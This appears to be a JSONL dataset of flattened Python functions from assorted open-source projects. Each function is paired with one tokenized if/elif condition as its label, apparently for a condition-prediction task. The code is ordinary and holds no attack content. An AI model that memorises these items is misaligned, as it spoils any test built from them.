{"input": "def _recursive_name_seach(self, layer_names, layer, pre_name, depth): for name, module in layer.named_children(): nname = pre_name + \"_\" + name if pre_name != \"\" else name if depth == self.depth or self.depth is None: if self._wrap_layer_check(module, name, nname): layer_names.append(nname) if self.depth is None or depth <= self.depth: if len(list(layer.named_children())) > 0: self._recursive_name_seach(layer_names, module, nname, depth + 1) return layer_names", "label": "if depth == self . depth or self . depth is None :"}
{"input": "def finished_at(self): f = self.metadata_get([\"State\", \"FinishedAt\"]) if f: f = f[:26] if f == \"0001-01-01T00:00:00Z\": return DINOSAUR_TIME finished_at = datetime.datetime.strptime(f, ISO_DATETIME_PARSE_STRING) return finished_at", "label": "if f == \"0001-01-01T00:00:00Z\" :"}
{"input": "def write_bool(self, bool): if ( self._bool_fid and self._bool_fid > self._last_fid and self._bool_fid - self._last_fid <= 15 ): if bool: ctype = CompactType.TRUE else: ctype = CompactType.FALSE self._write_field_header(ctype, self._bool_fid) else: if bool: self.write_byte(CompactType.TRUE) else: self.write_byte(CompactType.FALSE)", "label": "if bool :"}
{"input": "def update(self, topLeft, bottomRight): if self._updating: # We are currently putting data in the model, so no updates return if self._index: if topLeft.row() <= self._index.row() <= bottomRight.row(): self.updateText() elif self._indexes: update = False for i in self._indexes: if topLeft.row() <= i.row() <= bottomRight.row(): update = True if update: self.updateText()", "label": "if update :"}
{"input": "def _preprocess_add_items(self, items): \"\"\"Split the items into two lists of path strings and BaseEntries.\"\"\" paths = [] entries = [] for item in items: if isinstance(item, string_types): paths.append(self._to_relative_path(item)) elif isinstance(item, (Blob, Submodule)): entries.append(BaseIndexEntry.from_blob(item)) elif isinstance(item, BaseIndexEntry): entries.append(item) else: raise TypeError(\"Invalid Type: %r\" % item) # END for each item return (paths, entries)", "label": "if isinstance ( item , string_types ) :"}
{"input": "def ping_all(): for l in _all_listeners.values(): count = l.receiver.count() if count: for dev in l.receiver: dev.ping() l._status_changed(dev) count -= 1 if not count: break", "label": "if count :"}
{"input": "def stage_node_dot(g, stage): \"\"\"Create a stage node.\"\"\" with g.subgraph(name=\"cluster_\" + stage[\"id\"]) as subgraph: subgraph.attr(label=stage[\"name\"]) if stage[\"all_itervars\"]: for itervar in stage[\"all_itervars\"]: iv_type = itervar[\"itervar_type\"] itervar_node_dot(subgraph, itervar, iv_type, itervar[\"index\"]) for rel in stage[\"relations\"]: node_id = rel[\"id\"] itervar_relation_dot(subgraph, rel, node_id) else: subgraph.node(stage[\"name\"] + \"_placeholder\", style=\"invis\")", "label": "if stage [ \"all_itervars\" ] :"}
{"input": "def run() -> None: nonlocal state, timeout while True: if timeout > 0.0: disposed.wait(timeout) if disposed.is_set(): return time: datetime = self.now state = action(state) timeout = seconds - (self.now - time).total_seconds()", "label": "if disposed . is_set ( ) :"}
{"input": "def increment(s): if not s: return \"1\" for sequence in string.digits, string.lowercase, string.uppercase: lastc = s[-1] if lastc in sequence: i = sequence.index(lastc) + 1 if i >= len(sequence): if len(s) == 1: s = sequence[0] * 2 if s == \"00\": s = \"10\" else: s = increment(s[:-1]) + sequence[0] else: s = s[:-1] + sequence[i] return s return s # Don't increment", "label": "if i >= len ( sequence ) :"}
{"input": "def Import(self, patch, force): if not patch.get(\"file\"): if not patch.get(\"remote\"): raise PatchError(\"Patch file must be specified in patch import.\") else: patch[\"file\"] = bb.fetch2.localpath(patch[\"remote\"], self.d) for param in PatchSet.defaults: if not patch.get(param): patch[param] = PatchSet.defaults[param] if patch.get(\"remote\"): patch[\"file\"] = self.d.expand(bb.fetch2.localpath(patch[\"remote\"], self.d)) patch[\"filemd5\"] = bb.utils.md5_file(patch[\"file\"])", "label": "if not patch . get ( \"remote\" ) :"}
{"input": "def _setReadyState(self, state: str) -> None: if state != self.__readyState: self.__log_debug(\"- %s -> %s\", self.__readyState, state) self.__readyState = state if state == \"open\": self.emit(\"open\") elif state == \"closed\": self.emit(\"close\") # no more events will be emitted, so remove all event listeners # to facilitate garbage collection. self.remove_all_listeners()", "label": "if state == \"open\" :"}
{"input": "def count_brokers(self): self.nb_brokers = 0 for broker in self.brokers: if not broker.spare: self.nb_brokers += 1 for realm in self.higher_realms: for broker in realm.brokers: if not broker.spare and broker.manage_sub_realms: self.nb_brokers += 1", "label": "if not broker . spare and broker . manage_sub_realms :"}
{"input": "def _refresh(self): self.uiProfileSelectComboBox.clear() self.uiProfileSelectComboBox.addItem(\"default\") try: if os.path.exists(self.profiles_path): for profile in sorted(os.listdir(self.profiles_path)): if not profile.startswith(\".\"): self.uiProfileSelectComboBox.addItem(profile) except OSError: pass", "label": "if os . path . exists ( self . profiles_path ) :"}
{"input": "def run(self): for k, v in iteritems(self.objs): if k.startswith(\"_\"): continue if v[\"_class\"] == \"Dataset\" and v[\"task_type\"] == \"Communication\": try: params = json.loads(v[\"task_type_parameters\"]) except json.JSONDecodeError: pass else: if len(params) == 1: params.extend([\"stub\", \"fifo_io\"]) v[\"task_type_parameters\"] = json.dumps(params) return self.objs", "label": "if k . startswith ( \"_\" ) :"}
{"input": "def _listen(self, consumer_id: str) -> AsyncIterable[Any]: try: while True: if self._listening: async for msg in self._listen_to_queue(consumer_id): if msg is not None: yield msg await asyncio.sleep(0.5) else: async for msg in self._listen_to_ws(): yield msg except asyncio.CancelledError: pass except Exception as e: raise e", "label": "if msg is not None :"}
{"input": "def recv(self, bufsiz, flags=0): d = self._sock.recv(bufsiz, flags) if self.replace_pattern and b\" HTTP/1.1\\r\\n\" in d: line_end = d.find(b\"\\r\\n\") req_line = d[:line_end] words = req_line.split() if len(words) == 3: method, url, http_version = words url = url.replace(self.replace_pattern[0], self.replace_pattern[1]) d = b\"%s %s %s\" % (method, url, http_version) + d[line_end:] return d", "label": "if len ( words ) == 3 :"}
{"input": "def Import(self, patch, force): if not patch.get(\"file\"): if not patch.get(\"remote\"): raise PatchError(\"Patch file must be specified in patch import.\") else: patch[\"file\"] = bb.fetch2.localpath(patch[\"remote\"], self.d) for param in PatchSet.defaults: if not patch.get(param): patch[param] = PatchSet.defaults[param] if patch.get(\"remote\"): patch[\"file\"] = self.d.expand(bb.fetch2.localpath(patch[\"remote\"], self.d)) patch[\"filemd5\"] = bb.utils.md5_file(patch[\"file\"])", "label": "if not patch . get ( param ) :"}
{"input": "def delete(post_id): blogging_engine = _get_blogging_engine(current_app) storage = blogging_engine.storage post = storage.get_post_by_id(post_id) if (post is not None) and (current_user.get_id() == post[\"user_id\"]): success = storage.delete_post(post_id) if success: flash(\"Your post was successfully deleted\", \"info\") else: flash(\"Something went wrong while deleting your post\", \"warning\") else: flash(\"You do not have the rights to delete this post\", \"warning\") return redirect(url_for(\"blog_app.index\"))", "label": "if success :"}
{"input": "def update_schema_configs(state, schema): RegistrationSchema = state.get_model(\"osf\", \"registrationschema\") for rs in RegistrationSchema.objects.all(): if rs.schema.get(\"description\", False): rs.description = rs.schema[\"description\"] if rs.schema.get(\"config\", False): rs.config = rs.schema[\"config\"] rs.save()", "label": "if rs . schema . get ( \"config\" , False ) :"}
{"input": "def set_payload(self, value): del self[\"payload\"] if isinstance(value, ElementBase): if value.tag_name() in self.plugin_tag_map: self.init_plugin(value.plugin_attrib, existing_xml=value.xml) self.xml.append(value.xml) else: self.xml.append(value)", "label": "if value . tag_name ( ) in self . plugin_tag_map :"}
{"input": "def getCellPropertyNames_aux(self, col_id): if col_id == \"name\": if self.image_icon == \"places_busy\": return [\"places_busy\"] baseName = self.image_icon if self.isOpen: return [baseName + \"_open\"] else: return [baseName + \"_closed\"] return []", "label": "if self . isOpen :"}
{"input": "def one_xmm_reg_imm8(ii): # also allows SSE4 2-imm8 instr i, j, n = 0, 0, 0 for op in _gen_opnds(ii): if op_reg(op) and op_xmm(op): n += 1 elif op_imm8(op): i += 1 elif op_imm8_2(op): j += 1 else: return False return n == 1 and i == 1 and j <= 1", "label": "elif op_imm8 ( op ) :"}
{"input": "def step(self, action): \"\"\"Repeat action, sum reward, and max over last observations.\"\"\" total_reward = 0.0 done = None for i in range(self._skip): obs, reward, done, info = self.env.step(action) if i == self._skip - 2: self._obs_buffer[0] = obs if i == self._skip - 1: self._obs_buffer[1] = obs total_reward += reward if done: break # Note that the observation on the done=True frame doesn't matter. max_frame = self._obs_buffer.max(axis=0) return max_frame, total_reward, done, info", "label": "if i == self . _skip - 2 :"}
{"input": "def assertNodeSequenceEqual( self, seq1: Sequence[cst.CSTNode], seq2: Sequence[cst.CSTNode], msg: Optional[str] = None, ) -> None: suffix = \"\" if msg is None else f\"\\n{msg}\" if len(seq1) != len(seq2): raise AssertionError(f\"\\n{seq1!r}\\nis not deeply equal to \\n{seq2!r}{suffix}\") for node1, node2 in zip(seq1, seq2): if not node1.deep_equals(node2): raise AssertionError( f\"\\n{seq1!r}\\nis not deeply equal to \\n{seq2!r}{suffix}\" )", "label": "if not node1 . deep_equals ( node2 ) :"}
{"input": "def close(self): if self._file_writer is not None: if self.trial and self.trial.evaluated_params and self.last_result: flat_result = flatten_dict(self.last_result, delimiter=\"/\") scrubbed_result = { k: value for k, value in flat_result.items() if isinstance(value, tuple(VALID_SUMMARY_TYPES)) } self._try_log_hparams(scrubbed_result) self._file_writer.close()", "label": "if self . trial and self . trial . evaluated_params and self . last_result :"}
{"input": "def check_space(arr, task_id): for a in arr: if a.startswith(\"hadoop jar\"): found = False for x in shlex.split(a): if task_id in x: found = True if not found: raise AssertionError", "label": "if not found :"}
{"input": "def is_valid_block(self): \"\"\"check wheter the block is valid in the current position\"\"\" for i in range(self.block.x): for j in range(self.block.x): if self.block.get(i, j): if self.block.pos.x + i < 0: return False if self.block.pos.x + i >= COLUMNS: return False if self.block.pos.y + j < 0: return False if self.map.get((self.block.pos.x + i, self.block.pos.y + j), False): return False return True", "label": "if self . block . get ( i , j ) :"}
{"input": "def undo_block_stop(self): if self.undoblock.bump_depth(-1) == 0: cmd = self.undoblock self.undoblock = 0 if len(cmd) > 0: if len(cmd) == 1: # no need to wrap a single cmd cmd = cmd.getcmd(0) # this blk of cmds, or single cmd, has already # been done, so don't execute it again self.addcmd(cmd, 0)", "label": "if len ( cmd ) > 0 :"}
{"input": "def __(task: pipelines.Task): if not acl.current_user_has_permission(views.acl_resource): return bootstrap.card( header_left=\"Commands\", body=acl.inline_permission_denied_message() ) else: commands_card = bootstrap.card( header_left=\"Commands\", fixed_header_height=True, sections=[_render_command(command) for command in task.commands], ) if task.max_retries: return [ bootstrap.card(header_left=f\"Max retries: {task.max_retries}\"), commands_card, ] else: return commands_card", "label": "if task . max_retries :"}
{"input": "def closeEvent(self, e=None): \"\"\"Save settings and remove registered logging handler\"\"\" if self.editor.isModified(): # ask if user wants to save if self.wants_save(): if self.save(): e.accept() else: # saving error or user canceled e.ignore() else: # discard changes e.accept() else: # unchanged e.accept()", "label": "if self . save ( ) :"}
{"input": "def _merge(self, a, b, path=None): \"\"\"Merge two dictionaries, from http://stackoverflow.com/questions/7204805/dictionaries-of-dictionaries-merge\"\"\" if path is None: path = [] for key in b: if key in a: if isinstance(a[key], dict) and isinstance(b[key], dict): self._merge(a[key], b[key], path + [str(key)]) elif a[key] == b[key]: pass # same leaf value else: raise Exception(\"Conflict at %s\" % \".\".join(path + [str(key)])) else: a[key] = b[key] return a", "label": "if key in a :"}
{"input": "def _flags_helper(conf, atom, new_flags, test=False): try: new_flags = __salt__[\"portage_config.get_missing_flags\"](conf, atom, new_flags) except Exception: # pylint: disable=broad-except import traceback return {\"result\": False, \"comment\": traceback.format_exc()} if new_flags: old_flags = __salt__[\"portage_config.get_flags_from_package_conf\"](conf, atom) if not test: __salt__[\"portage_config.append_to_package_conf\"](conf, atom, new_flags) return {\"result\": True, \"changes\": {\"old\": old_flags, \"new\": new_flags}} return {\"result\": None}", "label": "if not test :"}
{"input": "def _confirm_deps(self, trans): if [pkgs for pkgs in trans.dependencies if pkgs]: dia = AptConfirmDialog(trans, parent=self.parent) res = dia.run() dia.hide() if res != Gtk.ResponseType.OK: log.debug(\"Response is: %s\" % res) if self.finish_handler: log.debug(\"Finish_handler...\") self.finish_handler(trans, 0, self.data) return self._run_transaction(trans)", "label": "if self . finish_handler :"}
{"input": "def get_supported_extensions(self): for item in self.get_subclasses(): instance = item() if instance.check(): for ext in instance.supports_extensions: self.extractors.update({instance.cls_name: instance}) try: self.extractors_by_extension[ext].append(instance) except KeyError: self.extractors_by_extension[ext] = [instance]", "label": "if instance . check ( ) :"}
{"input": "def find_module(self, fullname, path=None): # Check for local modules first... localname = fullname.split(\".\")[-1] name, ext = os.path.splitext(localname) try: fobj, filename, typeinfo = imp.find_module(name, path) except ImportError: logger.info(\"Dcode Searching: %s (%s)\", name, path) pymod = self.proxy.getPythonModule(fullname, path) if pymod: logger.info(\"Dcode Loaded: %s\", fullname) return DcodeLoader(*pymod)", "label": "if pymod :"}
{"input": "def run(self): try: self.server_sock = self._create_socket_and_bind() # in case self.port = 0 self.port = self.server_sock.getsockname()[1] self.ready_event.set() self._handle_requests() if self.wait_to_close_event: self.wait_to_close_event.wait(self.WAIT_EVENT_TIMEOUT) finally: self.ready_event.set() # just in case of exception self._close_server_sock_ignore_errors() self.stop_event.set()", "label": "if self . wait_to_close_event :"}
{"input": "def connection(self, commit_on_success=False): with self._lock: if self._bulk_commit: if self._pending_connection is None: self._pending_connection = sqlite.connect(self.filename) con = self._pending_connection else: con = sqlite.connect(self.filename) try: if self.fast_save: con.execute(\"PRAGMA synchronous = 0;\") yield con if commit_on_success and self.can_commit: con.commit() finally: if not self._bulk_commit: con.close()", "label": "if self . _pending_connection is None :"}
{"input": "def getReceiptInfo(pkgname): \"\"\"Get receipt info from a package\"\"\" info = [] if hasValidPackageExt(pkgname): display.display_debug2(\"Examining %s\" % pkgname) if os.path.isfile(pkgname): # new flat package info = getFlatPackageInfo(pkgname) if os.path.isdir(pkgname): # bundle-style package? info = getBundlePackageInfo(pkgname) elif pkgname.endswith(\".dist\"): info = parsePkgRefs(pkgname) return info", "label": "if os . path . isfile ( pkgname ) :"}
{"input": "def test_gen_speed(gen_func): cur_time = time.time() for idx, _ in enumerate(gen_func()): log.info(\"iter %s: %s s\" % (idx, time.time() - cur_time)) cur_time = time.time() if idx == 100: break", "label": "if idx == 100 :"}
{"input": "def __init__(self, *args, **kwargs): if not quickjs_available: msg = \"No supported QuickJS package found on custom python environment!\" if chakra_available: msg += \" Please install python package quickjs or use ChakraJSEngine.\" elif external_interpreter: msg += \" Please install python package quickjs or use ExternalJSEngine.\" else: msg += \" Please install python package quickjs.\" raise RuntimeError(msg) self._context = self.Context(self) InternalJSEngine.__init__(self, *args, **kwargs)", "label": "if chakra_available :"}
{"input": "def _draw_nodes(self, cr, bounding, highlight_items): highlight_nodes = [] for element in highlight_items: if isinstance(element, Edge): highlight_nodes.append(element.src) highlight_nodes.append(element.dst) else: highlight_nodes.append(element) for node in self.nodes: if bounding is None or node._intersects(bounding): node._draw(cr, highlight=(node in highlight_nodes), bounding=bounding)", "label": "if bounding is None or node . _intersects ( bounding ) :"}
{"input": "def upgrade(): bind = op.get_bind() session = db.Session(bind=bind) for slc in session.query(Slice).filter(Slice.viz_type.like(\"deck_%\")): params = json.loads(slc.params) if params.get(\"latitude\"): params[\"spatial\"] = { \"lonCol\": params.get(\"longitude\"), \"latCol\": params.get(\"latitude\"), \"type\": \"latlong\", } del params[\"latitude\"] del params[\"longitude\"] slc.params = json.dumps(params) session.merge(slc) session.commit() session.close()", "label": "if params . get ( \"latitude\" ) :"}
{"input": "def list_completers(): \"\"\"List the active completers\"\"\" o = \"Registered Completer Functions: \\n\" _comp = xsh_session.completers ml = max((len(i) for i in _comp), default=0) _strs = [] for c in _comp: if _comp[c].__doc__ is None: doc = \"No description provided\" else: doc = \" \".join(_comp[c].__doc__.split()) doc = justify(doc, 80, ml + 3) _strs.append(\"{: >{}} : {}\".format(c, ml, doc)) return o + \"\\n\".join(_strs) + \"\\n\"", "label": "if _comp [ c ] . __doc__ is None :"}
{"input": "def test_numeric_literals(self): @udf(BigIntVal(FunctionContext, SmallIntVal)) def fn(context, a): if a is None: return 1729 elif a < 0: return None elif a < 10: return a + 5 else: return a * 2", "label": "elif a < 0 :"}
{"input": "def get_normal_sample(in_file): \"\"\"Retrieve normal sample if normal/turmor\"\"\" with utils.open_gzipsafe(in_file) as in_handle: for line in in_handle: if line.startswith(\"##PEDIGREE\"): parts = line.strip().split(\"Original=\")[1][:-1] return parts", "label": "if line . startswith ( \"##PEDIGREE\" ) :"}
{"input": "def generate_html_index(index_file, outdir): data = parse_index_file(index_file) data = ((d[0], d[1]) for d in data) for i, chunk in enumerate(web.group(data, 1000)): back = \"..\" index = t_html_layout(t_html_sitemap(back, chunk)) path = outdir + \"/%02d/%05d.html\" % (i / 1000, i) write(path, web.safestr(index)) for f in os.listdir(outdir): path = os.path.join(outdir, f) if os.path.isdir(path): dirindex(path) dirindex(outdir, back=\".\")", "label": "if os . path . isdir ( path ) :"}
{"input": "def _aggregate_metadata_attribute( self, attr, agg_func=np.max, default_value=0, from_type_metadata=True ): attr_values = [] for a in self.appliances: if from_type_metadata: attr_value = a.type.get(attr) else: attr_value = a.metadata.get(attr) if attr_value is not None: attr_values.append(attr_value) if len(attr_values) == 0: return default_value else: return agg_func(attr_values)", "label": "if from_type_metadata :"}
{"input": "def install(self, unicode=False, names=None): import __builtin__ __builtin__.__dict__[\"_\"] = unicode and self.ugettext or self.gettext if hasattr(names, \"__contains__\"): if \"gettext\" in names: __builtin__.__dict__[\"gettext\"] = __builtin__.__dict__[\"_\"] if \"ngettext\" in names: __builtin__.__dict__[\"ngettext\"] = ( unicode and self.ungettext or self.ngettext ) if \"lgettext\" in names: __builtin__.__dict__[\"lgettext\"] = self.lgettext if \"lngettext\" in names: __builtin__.__dict__[\"lngettext\"] = self.lngettext", "label": "if \"lgettext\" in names :"}
{"input": "def logic(): while 1: if reset == ACTIVE_LOW: yield reset.posedge for i in range(20): yield clock.posedge if enable: count.next = i j = 1 while j < 25: if enable: yield clock.posedge yield clock.posedge count.next = 2 * j j += 1", "label": "if enable :"}
{"input": "def multi_device(reader, dev_count): if dev_count == 1: for batch in reader: yield batch else: batches = [] for batch in reader: batches.append(batch) if len(batches) == dev_count: yield batches batches = []", "label": "if len ( batches ) == dev_count :"}
{"input": "def lockfile_from_pipfile(cls, pipfile_path): from .pipfile import Pipfile if os.path.isfile(pipfile_path): if not os.path.isabs(pipfile_path): pipfile_path = os.path.abspath(pipfile_path) pipfile = Pipfile.load(os.path.dirname(pipfile_path)) return plette.lockfiles.Lockfile.with_meta_from(pipfile._pipfile) raise PipfileNotFound(pipfile_path)", "label": "if not os . path . isabs ( pipfile_path ) :"}
{"input": "def _resolve_result(self, f=None): try: if f: results = f.result() else: results = list(map(self._client.results.get, self.msg_ids)) if self._single_result: r = results[0] if isinstance(r, Exception): raise r else: results = error.collect_exceptions(results, self._fname) self._success = True self.set_result(self._reconstruct_result(results)) except Exception as e: self._success = False self.set_exception(e)", "label": "if self . _single_result :"}
{"input": "def config_update(self, *updates): filename = os.path.join(self.path, \".git\", \"config\") with GitConfigParser(file_or_files=filename, read_only=False) as config: for section, key, value in updates: try: old = config.get(section, key) if value is None: config.remove_option(section, key) continue if old == value: continue except (NoSectionError, NoOptionError): pass if value is not None: config.set_value(section, key, value)", "label": "if value is not None :"}
{"input": "def process_percent(token, state, command_line): if not state.is_range_start_line_parsed: if command_line.line_range.start: raise ValueError(\"bad range: {0}\".format(state.scanner.state.source)) command_line.line_range.start.append(token) else: if command_line.line_range.end: raise ValueError(\"bad range: {0}\".format(state.scanner.state.source)) command_line.line_range.end.append(token) return parse_line_ref, command_line", "label": "if command_line . line_range . end :"}
{"input": "def Flatten(self, metadata, value_to_flatten): if metadata: self.metadata = metadata for desc in value_to_flatten.type_infos: if desc.name == \"metadata\": continue if hasattr(self, desc.name) and value_to_flatten.HasField(desc.name): setattr(self, desc.name, getattr(value_to_flatten, desc.name))", "label": "if desc . name == \"metadata\" :"}
{"input": "def create_model(model, args, is_train): \"\"\"Create model, include basic model, googlenet model and mixup model\"\"\" data_loader, data = utility.create_data_loader(is_train, args) if args.model == \"GoogLeNet\": loss_out = _googlenet_model(data, model, args, is_train) else: if args.use_mixup and is_train: loss_out = _mixup_model(data, model, args, is_train) else: loss_out = _basic_model(data, model, args, is_train) return data_loader, loss_out", "label": "if args . use_mixup and is_train :"}
{"input": "def __init__(self, store): if store.context_aware: self.contexts = list(store.contexts()) self.default_context = store.default_context.identifier if store.default_context: self.contexts.append(store.default_context) else: self.contexts = [store] self.default_context = None super(TrigSerializer, self).__init__(store)", "label": "if store . default_context :"}
{"input": "def validate_import_depth(namespace): depth = namespace.depth if depth is not None: try: depth = int(depth) if depth < 1: raise CLIError(\"Depth should be at least 1.\") except ValueError: raise CLIError(\"Depth is not a number.\")", "label": "if depth < 1 :"}
{"input": "def __sync(self): \"\"\"Skip reader to the block boundary.\"\"\" pad_length = BLOCK_SIZE - self.__reader.tell() % BLOCK_SIZE if pad_length and pad_length != BLOCK_SIZE: data = self.__reader.read(pad_length) if len(data) != pad_length: raise EOFError(\"Read %d bytes instead of %d\" % (len(data), pad_length))", "label": "if len ( data ) != pad_length :"}
{"input": "def _split_long_text(text, idx, size): splited_text = text.split() if len(splited_text) > 25: if idx == 0: # The first is (...)text first = \"\" else: first = \" \".join(splited_text[:10]) if idx != 0 and idx == size - 1: # The last is text(...) last = \"\" else: last = \" \".join(splited_text[-10:]) return \"{}(...){}\".format(first, last) return text", "label": "if idx == 0 :"}
{"input": "def download_label_map(out_dir): log.info(\"Downloading ScanNet \" + RELEASE_NAME + \" label mapping file...\") files = [LABEL_MAP_FILE] for file in files: url = BASE_URL + RELEASE_TASKS + \"/\" + file localpath = os.path.join(out_dir, file) localdir = os.path.dirname(localpath) if not os.path.isdir(localdir): os.makedirs(localdir) download_file(url, localpath) log.info(\"Downloaded ScanNet \" + RELEASE_NAME + \" label mapping file.\")", "label": "if not os . path . isdir ( localdir ) :"}
{"input": "def get_related_ids(self, resources): vpc_ids = [vpc[\"VpcId\"] for vpc in resources] vpc_igw_ids = set() for igw in self.manager.get_resource_manager(\"internet-gateway\").resources(): for attachment in igw[\"Attachments\"]: if attachment.get(\"VpcId\", \"\") in vpc_ids: vpc_igw_ids.add(igw[\"InternetGatewayId\"]) return vpc_igw_ids", "label": "if attachment . get ( \"VpcId\" , \"\" ) in vpc_ids :"}
{"input": "def visit_Assign(self, node): \"\"\"Handle visiting an assignment statement.\"\"\" ups = set() for targ in node.targets: if isinstance(targ, (Tuple, List)): ups.update(leftmostname(elt) for elt in targ.elts) elif isinstance(targ, BinOp): newnode = self.try_subproc_toks(node) if newnode is node: ups.add(leftmostname(targ)) else: return newnode else: ups.add(leftmostname(targ)) self.ctxupdate(ups) return node", "label": "if newnode is node :"}
{"input": "def evex_mask_dest_reg_only(ii): # optional imm8 i, m, xyz = 0, 0, 0 for op in _gen_opnds(ii): if op_mask_reg(op): m += 1 elif op_xmm(op) or op_ymm(op) or op_zmm(op): xyz += 1 elif op_imm8(op): i += 1 else: return False return m == 1 and xyz > 0 and i <= 1", "label": "elif op_imm8 ( op ) :"}
{"input": "def get_pynames(self, parameters): result = [None] * max(len(parameters), len(self.args)) for index, arg in enumerate(self.args): if isinstance(arg, ast.keyword) and arg.arg in parameters: result[parameters.index(arg.arg)] = self._evaluate(arg.value) else: result[index] = self._evaluate(arg) return result", "label": "if isinstance ( arg , ast . keyword ) and arg . arg in parameters :"}
{"input": "def _discovery_modules(self) -> List[str]: modules: List[str] = [] autodiscover = self.conf.autodiscover if autodiscover: if isinstance(autodiscover, bool): if self.conf.origin is None: raise ImproperlyConfigured(E_NEED_ORIGIN) elif callable(autodiscover): modules.extend(cast(Callable[[], Iterator[str]], autodiscover)()) else: modules.extend(autodiscover) if self.conf.origin: modules.append(self.conf.origin) return modules", "label": "if isinstance ( autodiscover , bool ) :"}
{"input": "def _lock(self, files, type): for i in count(0): lockfile = os.path.join(self._lockdir, \"{}.{}.lock\".format(i, type)) if not os.path.exists(lockfile): self._lockfile[type] = lockfile with open(lockfile, \"w\") as lock: print(*files, sep=\"\\n\", file=lock) return", "label": "if not os . path . exists ( lockfile ) :"}
{"input": "def _init_inheritable_dicts_(cls): if cls.__bases__ != (object,): return for attr in cls._inheritable_dict_attrs_: if isinstance(attr, tuple): attr_name, default = attr else: attr_name, default = attr, {} if not isinstance(default, dict): raise SyntaxError(\"{} is not a dictionary\".format(attr_name)) setattr(cls, attr_name, default)", "label": "if not isinstance ( default , dict ) :"}
{"input": "def _validate_name(self, name): if isinstance(name, str): name = dns.name.from_text(name, None) elif not isinstance(name, dns.name.Name): raise KeyError(\"name parameter must be convertible to a DNS name\") if name.is_absolute(): if not name.is_subdomain(self.origin): raise KeyError(\"name parameter must be a subdomain of the zone origin\") if self.relativize: name = name.relativize(self.origin) return name", "label": "if self . relativize :"}
{"input": "def hard_update(self, cache, size_change, pins_gates): \"\"\"replace verts, rads and vel (in NumPy)\"\"\" verts, rads, vel, react = cache if len(verts) == self.v_len: if pins_gates[0] and pins_gates[1]: unpinned = self.params[\"unpinned\"] self.verts[unpinned] = verts[unpinned] else: self.verts = verts self.vel = vel if not size_change: self.rads = rads", "label": "if pins_gates [ 0 ] and pins_gates [ 1 ] :"}
{"input": "def enable(self): \"\"\"enable the patch.\"\"\" for patch in self.dependencies: patch.enable() if not self.enabled: pyv = sys.version_info[0] if pyv == 2: if self.PY2 == SKIP: return # skip patch activation if not self.PY2: raise IncompatiblePatch(\"Python 2 not supported!\") if pyv == 3: if self.PY3 == SKIP: return # skip patch activation if not self.PY3: raise IncompatiblePatch(\"Python 3 not supported!\") self.pre_enable() self.do_enable() self.enabled = True", "label": "if not self . PY3 :"}
{"input": "def on_project_dialog_finished(self): if self.sender().committed: if self.sender().new_project: self.close_project() self.project_manager.from_dialog(self.sender()) else: self.project_manager.project_updated.emit()", "label": "if self . sender ( ) . new_project :"}
{"input": "def filter_database(db, user, filter_name): \"\"\"Returns a list of person handles\"\"\" filt = MatchesFilter([filter_name]) filt.requestprepare(db, user) if user: user.begin_progress( _(\"Finding relationship paths\"), _(\"Retrieving all sub-filter matches\"), db.get_number_of_people(), ) matches = [] for handle in db.iter_person_handles(): person = db.get_person_from_handle(handle) if filt.apply(db, person): matches.append(handle) if user: user.step_progress() if user: user.end_progress() filt.requestreset() return matches", "label": "if filt . apply ( db , person ) :"}
{"input": "def add(self, key, val): if key is None: g.trace(\"TypeDict: None is not a valid key\", g.callers()) return self._checkKeyType(key) self._checkValType(val) if self.isList: aList = self.d.get(key, []) if val not in aList: aList.append(val) self.d[key] = aList else: self.d[key] = val", "label": "if val not in aList :"}
{"input": "def show_help(ctx, param, value): if value and not ctx.resilient_parsing: if not ctx.invoked_subcommand: # legit main help echo(format_help(ctx.get_help())) else: # legit sub-command help echo(ctx.get_help(), color=ctx.color) ctx.exit()", "label": "if not ctx . invoked_subcommand :"}
{"input": "def wav_to_spec(wav_audio, hparams): \"\"\"Transforms the contents of a wav file into a series of spectrograms.\"\"\" if hparams.spec_type == \"raw\": spec = _wav_to_framed_samples(wav_audio, hparams) else: if hparams.spec_type == \"cqt\": spec = _wav_to_cqt(wav_audio, hparams) elif hparams.spec_type == \"mel\": spec = _wav_to_mel(wav_audio, hparams) else: raise ValueError(\"Invalid spec_type: {}\".format(hparams.spec_type)) if hparams.spec_log_amplitude: spec = librosa.power_to_db(spec) return spec", "label": "if hparams . spec_type == \"cqt\" :"}
{"input": "def __bytes__(self) -> bytes: payload = pack(\"!LL\", self.ssrc, self.media_ssrc) if self.lost: pid = self.lost[0] blp = 0 for p in self.lost[1:]: d = p - pid - 1 if d < 16: blp |= 1 << d else: payload += pack(\"!HH\", pid, blp) pid = p blp = 0 payload += pack(\"!HH\", pid, blp) return pack_rtcp_packet(RTCP_RTPFB, self.fmt, payload)", "label": "if d < 16 :"}
{"input": "def run() -> None: nonlocal state, timeout while True: if timeout > 0.0: disposed.wait(timeout) if disposed.is_set(): return time: datetime = self.now state = action(state) timeout = seconds - (self.now - time).total_seconds()", "label": "if timeout > 0.0 :"}
{"input": "def _get_host(self, array, connector, remote=False): \"\"\"Return dict describing existing Purity host object or None.\"\"\" if remote and array.get_rest_version() in SYNC_REPLICATION_REQUIRED_API_VERSIONS: hosts = array.list_hosts(remote=True) else: hosts = array.list_hosts() matching_hosts = [] for host in hosts: for wwn in connector[\"wwpns\"]: if wwn.lower() in str(host[\"wwn\"]).lower(): matching_hosts.append(host) break # go to next host return matching_hosts", "label": "if wwn . lower ( ) in str ( host [ \"wwn\" ] ) . lower ( ) :"}
{"input": "def validate_moment(self, moment: \"cirq.Moment\"): super().validate_moment(moment) for op in moment.operations: if isinstance(op.gate, ops.CZPowGate): for other in moment.operations: if other is not op and self._check_if_exp11_operation_interacts( cast(ops.GateOperation, op), cast(ops.GateOperation, other) ): raise ValueError(\"Adjacent Exp11 operations: {}.\".format(moment))", "label": "if isinstance ( op . gate , ops . CZPowGate ) :"}
{"input": "def construct_instances(self, row, keys=None): collected_models = {} for i, (key, constructor, attr, conv) in enumerate(self.column_map): if keys is not None and key not in keys: continue value = row[i] if key not in collected_models: collected_models[key] = constructor() instance = collected_models[key] if attr is None: attr = self.cursor.description[i][0] if conv is not None: value = conv(value) setattr(instance, attr, value) return collected_models", "label": "if keys is not None and key not in keys :"}
{"input": "def test_all(self): expected = [] blacklist = {\"executable\", \"nobody_uid\", \"test\"} for name in dir(server): if name.startswith(\"_\") or name in blacklist: continue module_object = getattr(server, name) if getattr(module_object, \"__module__\", None) == \"http.server\": expected.append(name) self.assertCountEqual(server.__all__, expected)", "label": "if getattr ( module_object , \"__module__\" , None ) == \"http.server\" :"}
